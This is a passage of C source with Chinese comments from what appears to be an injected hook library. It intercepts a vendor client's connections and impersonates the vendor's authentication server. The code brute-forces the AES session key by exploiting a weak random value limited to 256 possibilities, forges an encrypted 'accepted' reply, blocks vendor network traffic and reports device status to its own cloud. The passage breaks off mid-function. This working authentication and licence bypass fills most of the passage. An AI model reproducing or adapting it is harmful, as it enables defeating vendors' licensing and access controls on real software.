/// ★ v6.25c：取本机设备码，填进 80B 应答的偏移 38..69。
///   来源优先级：conf token=（deb postinst 从 agent.log 提取后写入，最稳）
///               → DATA_DIR/log/agent.log 最后一条 `send dev online success:<32hex>`
///   实测（v6.25a 现网）：Agent 并不校验这段内容（模板里写错的码也照过），
///   填真实码是为了①日志可核对是哪台机在跑桩 ②万一 Agent/厂商后续加校验不崩。
///   两者都取不到 → 打日志并沿用模板里的码（宁可码不对，也不能不应答）。
static void off_load_devid(void) {
    char buf[512], last[33];
    FILE *f;
    if (g_off_devid[0]) return;
    if (off_is_hex32(g_token)) {
        memcpy(g_off_devid, g_token, 32);
        g_off_devid[32] = 0;
        bs_log("[off] devid=%s (src=conf)", g_off_devid);
        return;
    }
    last[0] = 0;
    f = fopen(DATA_DIR "/log/agent.log", "r");
    if (f) {
        while (fgets(buf, sizeof(buf), f)) {
            char *p = strstr(buf, "send dev online success:");
            if (p && off_is_hex32(p + 24)) { memcpy(last, p + 24, 32); last[32] = 0; }
        }
        fclose(f);
    }
    if (last[0]) {
        memcpy(g_off_devid, last, 32);
        g_off_devid[32] = 0;
        bs_log("[off] devid=%s (src=agent.log)", g_off_devid);
        return;
    }
    bs_log("[off] no devid, reply with template code");
}

/// ★ v6.25b：真离线开关的唯一写入口（conf 与 /hb 下发共用）。
///   NULL      = 字段缺失 → 保持现值（兼容老中控，删规则不会误关）
///   ""/"0"/"off"/"false"/"no" = 关闭；其余非空 = 开启
///   值未变时不重复打日志（心跳每 60s 一次，避免刷屏）
static void bs_offline_apply(const char *v, const char *src) {
    int on;
    if (!v) return;
    on = (*v == 0 || !strcmp(v, "0") || !strcmp(v, "off") ||
          !strcmp(v, "false") || !strcmp(v, "no")) ? 0 : 1;
    if (on == g_offline) return;
    g_offline = on;
    bs_log("[off] offline=%d (%s) src=%s", on,
           on ? "server2 fully in-process, zero vendor traffic"
              : "vendor passthrough", src);
}

/// 走 dlsym 拿 CommonCrypto（Agent 已导入 CCCrypt/CC_MD5，必然已加载 libcommonCrypto）
static int off_md5(const uint8_t *in, size_t n, uint8_t out[16]) {
    static int (*f)(const void *, size_t, void *) = NULL;
    if (!f) f = (int (*)(const void *, size_t, void *))dlsym(RTLD_DEFAULT, "CC_MD5");
    if (!f) return -1;
    f(in, n, out);
    return 0;
}

/// AES-128-CBC 加密，无 padding（明文长度必须是 16 的整数倍）
static int off_aes_enc(const uint8_t key[16], const uint8_t iv[16],
                       const uint8_t *in, size_t n, uint8_t *out, size_t *moved) {
    static int (*f)(unsigned, unsigned, unsigned, const void *, size_t,
                    const void *, const void *, size_t, void *, size_t,
                    size_t *) = NULL;
    if (!f)
        f = (int (*)(unsigned, unsigned, unsigned, const void *, size_t,
                     const void *, const void *, size_t, void *, size_t,
                     size_t *))dlsym(RTLD_DEFAULT, "CCCrypt");
    if (!f) return -1;
    *moved = 0;
    // op=0(encrypt) alg=0(AES128) options=0(无填充)
    return f(0, 0, 0, key, 16, iv, in, n, out, n, moved);
}

static int off_hexval(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/// 生成 32B 会话材料（厂商不校验内容，任意值均可）
static void off_make_m_buf(uint8_t *out) {
    arc4random_buf(out, 32);
}

/// 80B 明文（厂商应答原文，逐字节实测解密所得）
///
/// ★ v6.25c：模板里的设备码只是**占位**，真正应答前一定用本机设备码覆盖
///   偏移 38..69（32 字节 ASCII-hex）。取不到本机码时才沿用模板值。
///   尾部 70..79（07 00 0b + 7B）保持实测原值不动 —— 实测证明它不随设备码变化
///   （v6.25a 带着写错的设备码仍被判 accepted），改它反而有风险。
static const uint8_t *off_plain80(void) {
    static uint8_t plain[80];
    static int     ok = 0;
    if (ok == 1) return plain;
    if (ok < 0)  return NULL;
    const char *h = OFF_RESP80_HEX;
    size_t i;
    // volatile：h 是编译期字面量，-O2 会算出 strlen==160 恒真 → 整段检查被当死代码消掉
    volatile size_t need = 160;
    if (strlen(h) != need) {         // 防止改模板行时把长度写错 → 越界读
        ok = -1;
        bs_log("[off] RESP80 hex len=%d (want 160)", (int)strlen(h));
        return NULL;
    }
    for (i = 0; i < 80; i++) {
        int hi = off_hexval(h[i * 2]), lo = off_hexval(h[i * 2 + 1]);
        if (hi < 0 || lo < 0) { ok = -1; bs_log("[off] bad RESP80 hex"); return NULL; }
        plain[i] = (uint8_t)((hi << 4) | lo);
    }
    off_load_devid();
    if (g_off_devid[0]) memcpy(plain + 38, g_off_devid, 32);
    ok = 1;
    return plain;
}

/// AES-128-CBC 解密，无 padding
static int off_aes_dec(const uint8_t key[16], const uint8_t iv[16],
                       const uint8_t *in, size_t n, uint8_t *out, size_t *moved) {
    static int (*f)(unsigned, unsigned, unsigned, const void *, size_t,
                    const void *, const void *, size_t, void *, size_t,
                    size_t *) = NULL;
    if (!f)
        f = (int (*)(unsigned, unsigned, unsigned, const void *, size_t,
                     const void *, const void *, size_t, void *, size_t,
                     size_t *))dlsym(RTLD_DEFAULT, "CCCrypt");
    if (!f) return -1;
    *moved = 0;
    // op=1(decrypt) alg=0(AES128) options=0
    return f(1, 0, 0, key, 16, iv, in, n, out, n, moved);
}

/// 从 208B 请求反推 AES key。
///
/// 不需要 RSA 私钥，也不需要 hook 加密函数 —— 因为 208B 的明文首 4 字节是
/// `d0 00 00 00`（= 总长 208 的小端），这是一个 32 bit 的已知明文。
/// 而实测设备的 32B 随机 R 恒为单字节重复（0xec×32 / 0x16×32 / 0x3f×32 …），
/// 于是 key = MD5(R) 只有 256 种可能 —— 逐一试解密首块，命中 `d0 00 00 00` 即中。
///
/// 命中判据 4 字节全等，误判概率 1/2^32，实测 8 轮全部一次命中。
static int off_recover_key(const uint8_t *ct, size_t ctlen, const uint8_t m[32],
                           uint8_t key_out[16], size_t expect_len) {
    uint8_t iv[16], r[32], dec[32];
    size_t  moved = 0;
    int     b;

    if (ctlen < 16) return -1;
    if (off_md5(m, 32, iv) != 0) return -1;

    for (b = 0; b < 256; b++) {
        memset(r, (uint8_t)b, 32);
        if (off_md5(r, 32, key_out) != 0) return -1;
        if (off_aes_dec(key_out, iv, ct, 16, dec, &moved) != 0 || moved != 16)
            continue;
        // ★ v6.27：命中判据参数化 —— 明文首 4 字节 = 明文总长（小端），
        //   208 只是其中一种；实测还有 192。3 个高位字节必须为 0。
        if (expect_len > 0 && expect_len < 256 &&
            dec[0] == (uint8_t)(expect_len & 0xff) &&
            dec[1] == 0x00 && dec[2] == 0x00 && dec[3] == 0x00) {
            bs_log("[off] key recovered (R=0x%02x x32, key=%02x%02x%02x%02x)",
                   b, key_out[0], key_out[1], key_out[2], key_out[3]);
            return 0;
        }
    }
    return -1;
}

/// ★ v6.27：从密文首块探测明文包长（自适应 192/208/…）。
///
/// 厂商包是自描述 TLV：明文首 4 字节 = 明文总长（小端）。key = MD5(R)，
/// 而实测 R 恒为单字节重复的 32 字节 → 只有 256 种可能，逐个试解首块即可。
/// 判据放宽到「3 个高位字节为 0 且首字节 32..255」（因为此时还不知道长度，
/// 不能像 off_recover_key 那样比对具体值）；误判概率约 2^-24，可忽略。
///
/// 返回明文长度（>=32），失败 -1。成功时 key_out 填好，后续解密直接复用。
static int off_probe_len(const uint8_t *ct, const uint8_t m[32], uint8_t key_out[16]) {
    uint8_t iv[16], r[32], dec[16];
    size_t  moved = 0;
    int     b;
    if (off_md5(m, 32, iv) != 0) return -1;
    for (b = 0; b < 256; b++) {
        memset(r, (uint8_t)b, 32);
        if (off_md5(r, 32, key_out) != 0) return -1;
        if (off_aes_dec(key_out, iv, ct, 16, dec, &moved) != 0 || moved != 16)
            continue;
        if (dec[1] == 0x00 && dec[2] == 0x00 && dec[3] == 0x00 &&
            dec[0] >= 32) {
            bs_log("[off] pkt len probed=%d (R=0x%02x x32)", (int)dec[0], b);
            return (int)dec[0];
        }
    }
    return -1;
}

/// ★ v6.25e：哨兵状态跨进程共享。
///   实测（2026-10-21 .216）发现一个致命的架构差异：**装 connect 钩子的进程
///   和发 /hb 的进程不是同一个**（钩子/桩线程在跑厂商客户端的进程，心跳在 Agent），
///   于是桩里置的 g_off_stall 在 /hb 那边永远读到 0 —— 日志里 STALL 已经打了，
///   心跳却仍报 `of=ok&ofn=0`，设备表也就永远不标红。
///   解决办法：把状态落一行小文件，两个进程共用；/hb 侧任取「更坏」的那个。
///   格式：`<epoch> <ok|stall> <ofn>\n`。超过 OFF_STATE_TTL 视为陈旧（进程早死了）。
#define OFF_STATE_PATH  DATA_DIR "/.bs_off_state"
#define OFF_STATE_TTL   900      // 秒。心跳 60s 一次，15 分钟没更新说明那个进程没了

/// 读共享状态。返回 1 = 文件里的 stall 有效（未过期）。
///   ofn       连击数（可为 NULL）
///   first_bad 首次进入告警的时间戳（可为 NULL）。老格式没有第 4 字段 → 0
///   ★ v6.25h：第 4 字段是 v6.25h 新加的。告警期间每轮都会刷文件，若拿"最后一次
///     写入时间"算恢复耗时，永远只剩一个轮次（15~20s），看不出到底坏了多久。
static int off_state_read_ex(int *ofn, long *first_bad) {
    char    buf[96];
    int     fd = open(OFF_STATE_PATH, O_RDONLY);
    ssize_t n;
    long    ts = 0, fb = 0;
    char    word[16];
    int     v = 0;
    if (ofn) *ofn = 0;
    if (first_bad) *first_bad = 0;
    if (fd < 0) return 0;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = 0;
    if (sscanf(buf, "%ld %15s %d %ld", &ts, word, &v, &fb) < 2) return 0;
    if (v < 0) v = 0;
    if (ofn) *ofn = v;
    if (first_bad) *first_bad = (fb > 0) ? fb : ts;
    if (time(NULL) - ts > OFF_STATE_TTL) return 0;   // 陈旧 → 当没发生
    return strcmp(word, "stall") == 0;
}

static int off_state_read(int *ofn) { return off_state_read_ex(ofn, NULL); }

static void off_state_write(int stall, int ofn) {
    char    buf[96];
    int     n;
    ssize_t w;
    int     fd;
    long    now   = (long)time(NULL);
    long    first = 0;
    // ★ v6.25h：进入告警时继承「首次异常时间」，否则每轮刷新会把它冲掉。
    if (stall) {
        int  old = 0;
        long fb  = 0;
        if (off_state_read_ex(&old, &fb) && fb > 0) first = fb;
        if (first <= 0 || first > now) first = now;
    }
    n = snprintf(buf, sizeof(buf), "%ld %s %d %ld\n", now,
                 stall ? "stall" : "ok", ofn, first);
    fd = open(OFF_STATE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return;
    if (n > 0 && n < (int)sizeof(buf)) {
        w = write(fd, buf, (size_t)n);
        (void)w;                       // 单行小文件，写失败也无所谓，别让 -Wunused 报警
    }
    close(fd);
}

/// 桩工作线程：完全按实测的 262 → 38 → 208 → 80 → 16 顺序对答。
///   ★ 跑在 socketpair 的另一个端点上，Agent 的 select/poll 行为与真连接一致。
static void *off_worker(void *arg) {
    int s = (int)(intptr_t)arg;
    uint8_t acc[1024];
    size_t  accn = 0;
    int     want = 262;
    uint8_t m[32];
    int     round = 0;
    int     proto_bad = 0;     // ★ v6.25e：本次是否出现协议级异常（只有它计入连击）
    // ★ v6.25j：诊断 —— 本连接逐包记录「长度:首2字节hex」，最多 16 条
    int     plens[16];         // 期望长度（262/208/16）
    unsigned short phdr[16];   // 该包实收前 2 字节（拼成 short，仅用于打印）
    int     nplen  = 0;
    int     naccept = 0;
    char    seq[200];
    int     cur = 0;
    // ★ v6.27：密文包长度自适应
    int     needhdr  = 0;          // 1 = 刚回完 38，等首块探包长
    int     in_cmd   = 0;          // 1 = 当前 want 是探出来的密文包长度
    int     probefail = 0;         // 1 = 探测失败已回退 208
    uint8_t ck[16];                // 探测阶段算出的 AES key（复用到解密）

    // ★★★ v6.25j：**只改一处** —— 消费式缓冲，修「粘包尾巴被整块丢弃」
    //
    //   旧逻辑（v6.25i 及以前）：
    //       if (accn < want) { n = recv(acc+accn, 1024-accn); accn += n; continue; }
    //       ...处理这一包...
    //       accn = 0;                     <<< 缓冲里剩下的字节被整块扔掉
    //
    //   为什么必须改：客户端存在「262 与 208 在同一次 recv 到达」的时序
    //   （流水线写 / 单次 write）。此时 accn = 262+208 = 470，旧逻辑只认前 262
    //   -> 回 38 -> accn=0，后半个 208 被丢进黑洞。于是桩永远等 208、
    //   客户端永远等 80，30 秒后客户端打 `recv auth failed` 并 close，
    //   桩打 `stub conn closed (n=0)`。
    //   实测证据（2026-10-21 云端 24 台受害机，逐条吻合）：
    //     - `262 -> 38` 只间隔 14ms（数据早已到达，不是「没发」）
    //     - 每条连接恰好 30.0s 后 `closed(n=0)`（客户端超时主动关）
    //     - 桩侧 `stub idle` 行 0 条（从未等到 90s 超时）
    //     - 同版本同包，把 262/208 分两次写的机器全部正常 —— 纯粹是到达时序
    //
    //   ★ 为什么不按包头长度切包：208 是**加密包**，首字节是密文，不是长度！
    //     .216 真机实测 hdr=86d6 / 1521 / 43e0 完全随机；只有 262(0601)、
    //     38(2600)、16(1000) 三个明文包的首 2 字节才等于长度。
    //     所以包类型只能由状态机 want 判断，长度头仅用于诊断打印。
    for (;;) {
        // ★★★ v6.27：密文包长度自适应（本条是 v6.25j 之后剩下的活）
        //
        //   厂商请求包是**自描述 TLV**：明文首 4 字节 = 明文总长（小端）。
        //   实证：应答模板 OFF_RESP80_HEX 首 4 字节 = 50 00 00 00 = 80；
        //         请求包 208 的首 4 字节 = d0 00 00 00 = 208。
        //   所以 208 只是**其中一种长度**。实测同一批客户端还有发 192 的：
        //     [off] stub conn closed (n=0 want=208 accn=192)
        //   桩硬等 208 → 永远凑不齐 → 客户端 30s 后 recv auth failed → 脚本停。
        //   统计（86 台有该日志的设备）：208/192 的设备 auth_failed 37~38 次，
        //   262/0 的设备 0 次；与 iOS 版本无关（16.7.4~16.7.8 同样出现 192）。
        //
        //   做法：回完 38 先攒 16 字节首块 → 256 个 MD5(单字节×32) 试解 →
        //         明文首 4 字节就是包长 → want 设为它。探不出才回退 208。
        if (needhdr) {
            if (accn >= 16) {
                int L = off_probe_len(acc, m, ck);
                if (L >= 32) {
                    want = L;
                    in_cmd = 1;
                    needhdr = 0;
                    bs_log("[off] #%d cmd pkt len=%d (autodetect)", round, L);
                } else {
                    bs_log("[off] !! hdr probe fail accn=%zu head=%02x%02x%02x%02x"
                           "%02x%02x%02x%02x -> fallback 208",
                           accn, acc[0], acc[1], acc[2], acc[3],
                           acc[4], acc[5], acc[6], acc[7]);
                    want = 208;
                    in_cmd = 1;
                    needhdr = 0;
                    probefail = 1;
                }
                continue;           // 重新走循环：成功后立刻按新 want 处理
            }
            // accn < 16：首块还没齐，落到下面 recv
        } else {
        // ① 状态机：凑够 want 就处理，处理完**只消费 want 字节**，剩余前移
        while (accn >= (size_t)want) {
            size_t plen = (size_t)want;          // 本包要消费的字节数
            if (nplen < (int)(sizeof(plens) / sizeof(plens[0]))) {
                plens[nplen] = (int)plen;
                phdr[nplen]  = (unsigned short)((acc[0] << 8) | acc[1]);
                nplen++;
            }

            if (want == 262) {
                round++;
                off_make_m_buf(m);
                uint8_t r[38];
                r[0] = 0x26; r[1] = 0x00; r[2] = 0x00;
                r[3] = 0x00; r[4] = 0x01; r[5] = 0x00;
                memcpy(r + 6, m, 32);
                if (send(s, r, 38, 0) != 38) { bs_log("[off] send 38 failed"); goto done; }
                bs_log("[off] #%d 262 -> 38 (M=%02x%02x%02x%02x..)", round,
                       m[0], m[1], m[2], m[3]);
                // ★ v6.27：不再硬等 208 —— 先攒首块探真实包长
                want = 16;
                needhdr = 1;
            } else if (in_cmd) {
                const uint8_t *p80 = off_plain80();
                uint8_t iv[16], out[80];
                uint8_t pkt[512];
                size_t  cl = (size_t)want;      // ★ v6.27：实际包长（192/208/…）
                size_t  moved = 0;
                // ★ v6.25e：80B 应答模板解析不出来 = 固化的 TLV 结构不再成立 -> 协议级异常
                if (!p80) { proto_bad = 1; goto done; }
                if (cl > sizeof(pkt)) { proto_bad = 1; goto done; }
                // 精确抠出这一包（缓冲里可能还躺着下一包，不能直接把 acc 当整包）
                memcpy(pkt, acc, cl);
                // ① 首选：从明文首 4 字节（= 包长小端）反推 key（不依赖任何 hook）
                //    ★ v6.27：包长作参数传入；探测阶段已算出的 ck 会先被这次覆盖/校验
                if (off_recover_key(pkt, cl, m, ck, cl) != 0) {
                    // ★ v6.25e：厂商那块「已知明文头」不再能反推 key -> 协议级异常
                    proto_bad = 1;
                    // ② 退路：用 SecKeyEncrypt 抄到的 R
                    if (g_off_R_ok) {
                        memset(ck, 0, 16);
                        if (off_md5(g_off_R, 32, ck) == 0)
                            bs_log("[off] key from captured R (brute failed)");
                    } else {
                        memset(ck, 0, 16);
                        bs_log("[off] !! no key at all, reply will not decrypt");
                    }
                }
                if (off_md5(m, 32, iv) != 0) { bs_log("[off] md5 unavailable"); goto done; }
                if (off_aes_enc(ck, iv, p80, 80, out, &moved) != 0 || moved != 80) {
                    proto_bad = 1;   // ★ v6.25e：加密都走不通 -> 协议级异常
                    bs_log("[off] aes fail moved=%zu", moved); goto done;
                }
                if (send(s, out, 80, 0) != 80) { bs_log("[off] send 80 failed"); goto done; }
                bs_log("[off] #%d %zu -> 80 (auth ok)", round, cl);
                want = 16;
                in_cmd = 0;
            } else {                                  // want == 16（accepted 包）
                // ★ v6.25d：走到这里 = 授权链路全通，清掉失败连击
                naccept++;
                __sync_fetch_and_add(&g_off_n_ok, 1);
                g_off_fail_run = 0;
                // ★ v6.25e：无论是哪个进程走到 accepted，都证明厂商链路没坏 ->
                //   无条件清掉共享告警（这是唯一能证伪「协议变了」的硬证据）。
                // ★ v6.25h：**先读再清再判**。告警多半是上一次冷启前那个进程报的，
                //   本进程 g_off_stall 恒为 0，只看它就变成「状态清了、事件没打」。
                {
                    int  f_ofn = 0;
                    long f_fb  = 0;
                    int  was   = off_state_read_ex(&f_ofn, &f_fb) || g_off_stall;
                    int  wasn  = ((int)g_off_fail_run > f_ofn) ? (int)g_off_fail_run : f_ofn;
                    long from  = f_fb > 0 ? f_fb : g_off_last_bad;
                    off_state_write(0, 0);
                    if (was) {
                        long dur = (from > 0 && time(NULL) >= from)
                                 ? (long)(time(NULL) - from) : -1;
                        g_off_stall = 0;
                        bs_evt("[off] ★ recovered: accepted again after %lds "
                               "(was stall ofn=%d stub=%ld ok=%ld)",
                               dur, wasn, g_off_n_stub, g_off_n_ok);
                    }
                }
                bs_log("[off] #%d 16 = accepted, vendor chain fully bypassed", round);
                want = 262;
            }

            // ★ v6.25j：只消费掉本包长度，剩余字节**前移保留**
            //   （旧版这里是 accn = 0，粘包时把下一包整块扔掉）
            memmove(acc, acc + plen, accn - plen);
            accn -= plen;
        }
        }   // ★ v6.27：else 结束（needhdr 分支的另一半）

        // ② 收更多数据
        if (accn >= sizeof(acc)) {          // 缓冲满还凑不出完整包 -> 异常
            proto_bad = 1;
            bs_log("[off] rx buffer full (%zu want=%d) -> drop conn", accn, want);
            goto done;
        }
        ssize_t n = recv(s, acc + accn, sizeof(acc) - accn, 0);
        if (n <= 0) {
            // ★ v6.25e：SO_RCVTIMEO 到点会返回 -1/EAGAIN。客户端发完 262 收到 38
            //   后「既不发 208 也不关闭」的状态实测存在（卡密闸门已开时），
            //   以前 worker 永久阻塞 -> fd+线程泄漏。现在超时即收尾，且**不计数**。
            if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
                bs_log("[off] stub idle %ds -> close (want=%d accn=%zu pkts=%d)",
                       OFF_IDLE_TIMEOUT, want, accn, nplen);
            else
                bs_log("[off] stub conn closed (n=%zd want=%d accn=%zu)",
                       n, want, accn);
            break;
        }
        accn += (size_t)n;
    }

done:
    // ★ v6.25j：把本连接收到的包序列打一条 —— 云端日志只有尾 8KB，
    //   有了这一行就能直接看出「走到第几包 / 是否 accepted / 各包首字节形态」，
    //   不必再靠外部推理（v6.25i 之前所有现场都缺这个信息）。
    //   格式 长度:首2字节，如 262:0601,208:86d6 —— 208 头随机即证明它是密文包。
    if (nplen > 0) {
        for (int i = 0; i < nplen && cur < (int)sizeof(seq) - 12; i++)
            cur += snprintf(seq + cur, sizeof(seq) - cur, "%s%d:%04x",
                            i ? "," : "", plens[i], (unsigned)phdr[i]);
        bs_log("[off] conn pkts=[%s] accept=%d%s", seq, naccept,
               probefail ? " PROBE_FAIL" : "");
    }
    // ★ v6.25d：连接结束。★ v6.25e：**只有 proto_bad 才计入连击** ——
    //   「客户端主动断开」「只走两跳就关」「连接被上游取消」都是正常形态，
    //   数它们只会误报（真机回放：历史最长连击 9 次全由这些构成）。
    if (proto_bad) {
        int n = __sync_add_and_fetch(&g_off_fail_run, 1);
        g_off_last_bad = (long)time(NULL);
        // ★ v6.25e：每次协议异常都刷一次共享状态（不只告警那一刻）——
        //   /hb 在另一个进程，只写一次容易错过；刷最新 ofn 也便于看连击数。
        //   ★ 必须「保留」文件里仍有效的 stall：本进程只出 1 次异常时不能把
        //     另一个进程已经报出的告警清掉。
        {
            int f_ofn = 0;
            int f_stall = off_state_read(&f_ofn);
            off_state_write((n >= g_offstall) || g_off_stall || f_stall,
                            n > f_ofn ? n : f_ofn);
        }
        if (n >= g_offstall && !g_off_stall) {
            g_off_stall = 1;
            bs_evt("[off] ★ STALL %d consecutive protocol errors "
                   "(stub=%ld ok=%ld) -> vendor protocol likely changed",
                   n, g_off_n_stub, g_off_n_ok);
        }
    }
    close(s);
    return NULL;
}

/// 把 fd 换成 socketpair 端点并起桩线程。connect 替身返回 0 后由它接管。
static void off_start(int fd) {
    if (fd < 0) return;
    __sync_fetch_and_add(&g_off_n_stub, 1);   // ★ v6.25d：拦截计数（分母）
    if (!g_off_vendor_net) g_off_vendor_net = inet_addr(STAT_VENDOR_IP);
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
        bs_log("[off] socketpair fail errno=%d", errno);
        return;
    }
    if (dup2(sv[0], fd) < 0) {
        bs_log("[off] dup2 fail errno=%d", errno);
        close(sv[0]); close(sv[1]);
        return;
    }
    close(sv[0]);
    // ★ v6.25e：桩端接收超时。客户端发完 262、收到 38 后可能既不推进也不关闭
    //   （实测卡密闸门已开时如此），没超时的话 worker 永久阻塞 → 每轮泄漏
    //   一个 socketpair fd + 一个线程。超时后走 abort 分支收尾，不误判协议变更。
    {
        struct timeval tv;
        tv.tv_sec  = OFF_IDLE_TIMEOUT;
        tv.tv_usec = 0;
        setsockopt(sv[1], SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    }
    pthread_t th;
    pthread_attr_t at;
    pthread_attr_init(&at);
    pthread_attr_setdetachstate(&at, PTHREAD_CREATE_DETACHED);
    int rc = pthread_create(&th, &at, off_worker, (void *)(intptr_t)sv[1]);
    pthread_attr_destroy(&at);
    if (rc != 0) {
        bs_log("[off] pthread_create fail rc=%d", rc);
        close(sv[1]);
    }
}

// ★ v6.7：落盘后自动重启（conf autoreload=，默认开）
static int           g_autoreload   = 1;
// ★ v6.17：func-nil 崩溃自动恢复（conf crashresume=，默认开）
static int           g_crashresume  = 1;
// ★ v6.24q：g_need_reload / g_reload_busy / g_rl_ver 已随 [rl] 移除

static void bs_request_inject(uintptr_t base) {
    (void)base;
    g_need_inject = 1;
    bs_log("[pull] inject requested");
}

// ---- ★ v6.10 设备信息上报（纯 C：sysctl + 百分号编码） ----
static int bs_read_file(const char *path, unsigned char **out, size_t *outlen); // ★ v6.11 前置声明

static void bs_sysctl_str(const char *name, char *out, size_t n) {
    size_t len = n;
    memset(out, 0, n);
    if (sysctlbyname(name, out, &len, NULL, 0) != 0) { out[0] = 0; return; }
    if (len >= n) len = n - 1;
    out[len] = 0;   // len 可能含结尾 nul，多补一个无妨
}

static void bs_urlenc(const char *in, char *out, size_t n) {
    static const char *HEX = "0123456789ABCDEF";
    size_t j = 0;
    for (const unsigned char *p = (const unsigned char *)in; *p && j + 4 < n; p++) {
        unsigned char c = *p;
        if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            c == '-' || c == '_' || c == '.' || c == '~') {
            out[j++] = (char)c;
        } else {
            out[j++] = '%'; out[j++] = HEX[c >> 4]; out[j++] = HEX[c & 15];
        }
    }
    out[j] = 0;
}

// ★ v6.11：读 app.plist 的 <key>ip</key> → 其后的 <string>（中控 IP，用户手填）。
//   只作上报数据，不作服务端地址（v6.2 起与 BS_HOST 互不干扰）。
static void bs_pc_ip_of_plist(char *out, size_t n) {
    out[0] = 0;
    unsigned char *b = NULL; size_t bl = 0;
    if (!bs_read_file(DATA_DIR "/app.plist", &b, &bl)) return;
    const char *s = (const char *)b;
    const char *k = strstr(s, "<key>ip</key>");
    if (k) {
        const char *v = strstr(k, "<string>");
        if (v) {
            v += 8;
            const char *e = strstr(v, "</string>");
            if (e && (size_t)(e - v) < n) {
                memcpy(out, v, e - v);
                out[e - v] = 0;
            }
        }
    }
    free(b);
}

// ★★★★ v6.25i：离线出站白名单的实现。
//
//   设计取舍：为什么用「白名单」而不是「枚举厂商地址」——
//   厂商地址随时可加（换 IP、加备用域名、换 CDN），枚举永远补不完；
//   而离线机真正需要的对外通道只有三条：本机 server1（回环）、我们云端、中控。
//   把这三条列出来，其余默认拒绝，是唯一能结构性保证「零外发」的写法。
//
//   代价：中控 IP 变了要 10s 内跟上（缓存 TTL），且 egress=0 留了逃生门。

/// 目的地是否允许从本机出去（仅 offline=1 且 egress=1 时询问）。
static int      off_egress_ok(uint32_t nip);

/// 中控 IP（网络序，0=未知）。10s 缓存 —— app.plist 是现读文件，
///   用户中途改中控 IP 也能跟上，但不必每次 connect 都读盘。
static uint32_t off_allow_pc_net(void) {
    long     now = (long)time(NULL);
    char     ip[64];
    uint32_t n = 0;
    uint32_t t;
    if (g_off_pc_net && now - g_off_pc_ts < 10) return g_off_pc_net;
    ip[0] = 0;
    bs_pc_ip_of_plist(ip, sizeof(ip));                 // ① app.plist 现读（最权威）
    if (!ip[0] && g_stat_ip[0]) snprintf(ip, sizeof(ip), "%s", g_stat_ip);  // ② conf statip=
    if (!ip[0] && g_appip[0])   snprintf(ip, sizeof(ip), "%s", g_appip);    // ③ 加载时缓存
    if (ip[0]) {
        t = inet_addr(ip);
        if (t != INADDR_NONE) n = t;
    }
    g_off_pc_net = n;
    g_off_pc_ts  = now;
    return n;
}

/// 日志用的 IP 字符串（4 槽轮转，只用于打日志，非线程安全的取舍可接受）。
static const char *off_ip_str(uint32_t nip) {
    static char        slot[4][32];
    static int         idx = 0;
    char              *p   = slot[idx++ & 3];
    struct in_addr     ia;
    ia.s_addr = nip;
    if (!inet_ntop(AF_INET, &ia, p, 32)) snprintf(p, 32, "?");
    return p;
}

/// 这个目的地能不能出去。允许：回环 / 我们云端 / 中控。其余一律否。
static int off_egress_ok(uint32_t nip) {
    uint32_t h;
    if (!g_off_egress) return 1;                       // 逃生门：全放行
    if (!nip) return 0;
    if (!g_off_cloud_net) g_off_cloud_net = inet_addr(BS_HOST_DEF);
    h = ntohl(nip);
    if ((h >> 24) == 127) return 1;                    // 回环：厂商 server1 在本地
    if (g_off_cloud_net && nip == g_off_cloud_net) return 1;   // 我们云端（hb/pull/card）
    if (g_off_so_net && nip == g_off_so_net) return 1;         // conf sohost（beta.so 独立源）
    if (nip == off_allow_pc_net()) return 1;           // 中控
    return 0;
}

/// 记一次被拒的出口。TCP/UDP 分开计数；前 10 条全打，之后每 60 条采样一条。
static void off_deny(uint32_t nip, int port, int udp) {
    long n = udp ? __sync_add_and_fetch(&g_off_n_deny_u, 1)
                 : __sync_add_and_fetch(&g_off_n_deny, 1);
    if (n <= 10 || n % 60 == 1) {
        bs_log("[off] egress %s %s:%d denied (not in allowlist) (#%ld)",
               udp ? "udp" : "tcp", off_ip_str(nip), port, n);
    }
}

// ★ v6.25d：协议变更哨兵状态（&of=ok|stall&ofn=N）。
//   只在 offline=1 时带出 —— 透传设备根本没有桩，带这个字段会让设备表误判成"正常"。
static void bs_off_query(char *out, size_t n) {
    size_t cur;
    int    f_ofn = 0;
    int    f_stall;
    int    stall;
    int    ofn;
    if (!g_offline) return;
    // ★ v6.25e：钩子进程 ≠ 心跳进程 → 必须把共享状态文件的结论合并进来，
    //   否则会出现「日志已 STALL、心跳仍 ok」的假安全（实测踩过）。
    f_stall = off_state_read(&f_ofn);
    stall   = g_off_stall || f_stall;
    ofn     = (int)g_off_fail_run > f_ofn ? (int)g_off_fail_run : f_ofn;
    cur = strlen(out);
    if (cur + 28 < n)
        snprintf(out + cur, n - cur, "&of=%s&ofn=%d",
                 stall ? "stall" : "ok", ofn);
    // ★ v6.25g：心跳侧第一次真的把 stall 带出去时记一条 —— 现场只要看到这行，
    //   就说明「哨兵 → 云端」这一段是通的，不用再去翻云端设备表。
    if (stall && !g_off_hb_stall_logged) {
        g_off_hb_stall_logged = 1;
        bs_log("[off] hb carries of=stall ofn=%d (stub side already alarmed)", ofn);
    } else if (!stall) {
        // ★ v6.25h：恢复后复位，否则第二次告警时这行日志不再出现（只记首轮）
        g_off_hb_stall_logged = 0;
    }
}

/// ★ v6.25g：现算一份完整 query = g_qbuf（启动时拼好的 key+设备信息）+ 当前哨兵状态。
///   修的是 v6.25d~f 的真 bug：g_qbuf 只在 bs_load_conf 里拼**一次**，此后
///   bs_hb_ping / bs_pull_modules 直接拿它拼 URL —— 于是 &of=&ofn= 被冻在
///   进程启动那一刻的值（恒为 ok/0）。实测（2026-10-21 .216）：桩日志已打
///   `★ STALL 2 consecutive protocol errors`、共享状态文件已是 `stall 7`，
///   心跳却连着三拍报 `of=ok&ofn=0`，设备表永不标红。
///   所以哨兵字段必须**每次心跳重新取**，不能进 g_qbuf 缓存。
static void bs_q_live(char *out, size_t n) {
    snprintf(out, n, "%s", g_qbuf);
